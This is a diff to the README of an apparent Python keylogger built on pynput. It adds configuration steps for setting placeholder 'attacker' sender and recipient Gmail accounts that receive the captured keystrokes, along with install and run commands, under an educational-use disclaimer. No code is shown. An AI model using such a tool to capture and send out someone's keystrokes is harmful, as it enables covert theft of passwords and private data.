@@ -12,6 +12,11 @@ WARNING ⚠️: **This project is strictly for educational purposes, I will not 
 ![](email.png)
 ![](keystrokes.png)
 
+## Configuration:
+- LINE 9: Change sender email ``sender = 'attacker01mail@gmail.com'``
+- LINE 10: Change sender password ``password = 'attacker01password'``
+- LINE 54: Change recipient email ``create_and_send_email('attacker02mail@gmail.com'...``
+
 ## Usage:
 - Install pynput using the following command ``pip3 install pynput``
 - Run it using ``python main.py``
